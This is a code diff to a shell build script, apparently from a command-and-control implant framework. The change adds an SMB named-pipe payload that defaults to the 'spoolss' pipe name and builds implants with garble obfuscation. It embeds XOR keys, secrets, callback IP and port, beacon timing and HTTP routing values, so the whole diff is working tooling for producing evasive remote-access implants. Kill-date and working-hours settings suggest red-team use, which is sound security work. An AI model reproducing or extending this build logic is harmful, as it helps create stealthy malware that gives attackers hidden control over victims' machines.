@@ -75,6 +75,7 @@ generate_random_module_name() {
 # Function to setup the build directory
 setup_build_dir() {
     local build_os=$1
+    local payload_type=${PAYLOAD_TYPE:-http}
     local source_dir
 
     case "${build_os}" in
@@ -82,7 +83,12 @@ setup_build_dir() {
             source_dir="Linux"
             ;;
         "windows" | "win")
-            source_dir="Windows"
+            # Check if this is an SMB payload
+            if [ "$payload_type" = "smb" ]; then
+                source_dir="SMB_Windows"
+            else
+                source_dir="Windows"
+            fi
             ;;
         "darwin")
             source_dir="Darwin"
@@ -93,7 +99,7 @@ setup_build_dir() {
             ;;
     esac
 
-    echo "=== Setting up build directory for ${build_os} ==="
+    echo "=== Setting up build directory for ${build_os} (payload_type: ${payload_type}) ==="
     rm -rf /app/*
     mkdir -p /app
 
@@ -189,39 +195,64 @@ build_binary() {
     [ ! -z "${SAFETY_KILL_DATE}" ] && echo "  - Kill Date: ${SAFETY_KILL_DATE}"
     [ ! -z "${SAFETY_WORK_HOURS_START}" ] && echo "  - Working Hours: ${SAFETY_WORK_HOURS_START} - ${SAFETY_WORK_HOURS_END}"
 
+    # Build SMB-specific flags if this is an SMB payload
+    SMB_FLAGS=""
+    if [ "${PAYLOAD_TYPE}" = "smb" ]; then
+        echo "[*] Building SMB payload with pipe: ${PIPE_NAME:-spoolss}"
+        SMB_FLAGS="-X 'main.pipeName=${PIPE_NAME:-spoolss}'"
+    fi
+
     # Run garble build with all flags including safety checks
     cd /app
-    GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
-        -ldflags "-w -s -buildid= \
-        -X 'main.xorKey=${XOR_KEY}' \
-        -X 'main.clientID=${CLIENTID}' \
-        -X 'main.sleep=${SLEEP}' \
-        -X 'main.jitter=${JITTER}' \
-        -X 'main.userAgent=${USER_AGENT}' \
-        -X 'main.contentType=${CONTENT_TYPE}' \
-        -X 'main.customHeaders=${CUSTOM_HEADERS}' \
-        -X 'main.getRoute=${GET_ROUTE}' \
-        -X 'main.postRoute=${POST_ROUTE}' \
-        -X 'main.getMethod=${GET_METHOD}' \
-        -X 'main.postMethod=${POST_METHOD}' \
-        -X 'main.getClientIDName=${GET_CLIENT_ID_NAME}' \
-        -X 'main.getClientIDFormat=${GET_CLIENT_ID_FORMAT}' \
-        -X 'main.postClientIDName=${POST_CLIENT_ID_NAME}' \
-        -X 'main.postClientIDFormat=${POST_CLIENT_ID_FORMAT}' \
-        -X 'main.postSecretName=${POST_SECRET_NAME}' \
-        -X 'main.postSecretFormat=${POST_SECRET_FORMAT}' \
-        -X 'main.publicKey=${PUBLIC_KEY}' \
-        -X 'main.secret=${SECRET}' \
-        -X 'main.protocol=${PROTOCOL}' \
-        -X 'main.ip=${IP}' \
-        -X 'main.port=${PORT}' \
-        -X 'main.MALLEABLE_REKEY_COMMAND=${MALLEABLE_REKEY_COMMAND}' \
-        -X 'main.MALLEABLE_REKEY_STATUS_FIELD=${MALLEABLE_REKEY_STATUS_FIELD}' \
-        -X 'main.MALLEABLE_REKEY_DATA_FIELD=${MALLEABLE_REKEY_DATA_FIELD}' \
-        -X 'main.MALLEABLE_REKEY_ID_FIELD=${MALLEABLE_REKEY_ID_FIELD}' \
-        ${TOGGLE_FLAGS} \
-        ${SAFETY_FLAGS}" \
-        -trimpath -o "/output/${OUTPUT_FILENAME}"
+
+    # Use different ldflags for SMB vs HTTP payloads
+    if [ "${PAYLOAD_TYPE}" = "smb" ]; then
+        # SMB payload - uses xorKey for runtime decryption (same security as HTTPS)
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
+            -ldflags "-w -s -buildid= \
+            -X 'main.xorKey=${XOR_KEY}' \
+            -X 'main.clientID=${CLIENTID}' \
+            -X 'main.sleep=${SLEEP}' \
+            -X 'main.jitter=${JITTER}' \
+            -X 'main.secret=${SECRET}' \
+            -X 'main.encryptedConfig=${ENCRYPTED_CONFIG}' \
+            ${SMB_FLAGS} \
+            ${SAFETY_FLAGS}" \
+            -trimpath -o "/output/${OUTPUT_FILENAME}"
+    else
+        # HTTP payload - full ldflags
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
+            -ldflags "-w -s -buildid= \
+            -X 'main.xorKey=${XOR_KEY}' \
+            -X 'main.clientID=${CLIENTID}' \
+            -X 'main.sleep=${SLEEP}' \
+            -X 'main.jitter=${JITTER}' \
+            -X 'main.userAgent=${USER_AGENT}' \
+            -X 'main.contentType=${CONTENT_TYPE}' \
+            -X 'main.customHeaders=${CUSTOM_HEADERS}' \
+            -X 'main.getRoute=${GET_ROUTE}' \
+            -X 'main.postRoute=${POST_ROUTE}' \
+            -X 'main.getMethod=${GET_METHOD}' \
+            -X 'main.postMethod=${POST_METHOD}' \
+            -X 'main.getClientIDName=${GET_CLIENT_ID_NAME}' \
+            -X 'main.getClientIDFormat=${GET_CLIENT_ID_FORMAT}' \
+            -X 'main.postClientIDName=${POST_CLIENT_ID_NAME}' \
+            -X 'main.postClientIDFormat=${POST_CLIENT_ID_FORMAT}' \
+            -X 'main.postSecretName=${POST_SECRET_NAME}' \
+            -X 'main.postSecretFormat=${POST_SECRET_FORMAT}' \
+            -X 'main.publicKey=${PUBLIC_KEY}' \
+            -X 'main.secret=${SECRET}' \
+            -X 'main.protocol=${PROTOCOL}' \
+            -X 'main.ip=${IP}' \
+            -X 'main.port=${PORT}' \
+            -X 'main.MALLEABLE_REKEY_COMMAND=${MALLEABLE_REKEY_COMMAND}' \
+            -X 'main.MALLEABLE_REKEY_STATUS_FIELD=${MALLEABLE_REKEY_STATUS_FIELD}' \
+            -X 'main.MALLEABLE_REKEY_DATA_FIELD=${MALLEABLE_REKEY_DATA_FIELD}' \
+            -X 'main.MALLEABLE_REKEY_ID_FIELD=${MALLEABLE_REKEY_ID_FIELD}' \
+            ${TOGGLE_FLAGS} \
+            ${SAFETY_FLAGS}" \
+            -trimpath -o "/output/${OUTPUT_FILENAME}"
+    fi
 
     if [ ! -f "/output/${OUTPUT_FILENAME}" ]; then
         echo "Error: Binary build failed for ${os}/${arch}"
